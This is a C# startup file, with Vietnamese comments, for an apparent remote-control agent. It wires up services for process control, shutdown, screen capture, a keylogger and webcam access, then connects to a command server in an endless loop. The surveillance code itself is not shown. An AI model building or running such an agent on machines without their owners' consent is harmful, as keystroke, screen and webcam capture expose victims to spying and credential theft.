﻿using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using RemoteControl.Agent.Services.Input;
using RemoteControl.Agent.Services.Media;
using RemoteControl.Agent.Services.Networking;
using RemoteControl.Agent.Services.System;

// 1. Khởi tạo Builder
var builder = Host.CreateApplicationBuilder(args);

// 2. Đăng ký các Service (Dependency Injection)
builder.Services.AddSingleton<ProcessHandler>();  // Xử lý App/Process
builder.Services.AddSingleton<PowerHandler>();    // Xử lý Tắt nguồn
builder.Services.AddSingleton<ScreenCapturer>();  // Xử lý Chụp màn hình
builder.Services.AddSingleton<Keylogger>();       // Xử lý Bàn phím
builder.Services.AddSingleton<WebcamHandler>();   // Xử lý Webcam

// Đăng ký SocketClient là service chính
builder.Services.AddSingleton<SocketClient>();

// Xây dựng Host
using IHost host = builder.Build();

// 3. Lấy SocketClient ra để chạy
var logger = host.Services.GetRequiredService<ILogger<Program>>();
var socketClient = host.Services.GetRequiredService<SocketClient>();

logger.LogInformation(">>> AGENT ĐANG KHỞI ĐỘNG...");

try
{
    // Tạo CancellationToken để dừng ứng dụng an toàn
    var cts = new CancellationTokenSource();

    // Xử lý khi bấm Ctrl+C
    Console.CancelKeyPress += (sender, eventArgs) =>
    {
        logger.LogInformation("Đang tắt Agent...");
        cts.Cancel();
        eventArgs.Cancel = true;
    };

    // 4. BẮT ĐẦU KẾT NỐI SERVER
    // Hàm này sẽ chạy vòng lặp vĩnh viễn
    await socketClient.ConnectAsync(cts.Token);
}
catch (Exception ex)
{
    logger.LogCritical($"Lỗi không mong muốn: {ex.Message}");
}

logger.LogInformation("Agent đã tắt.");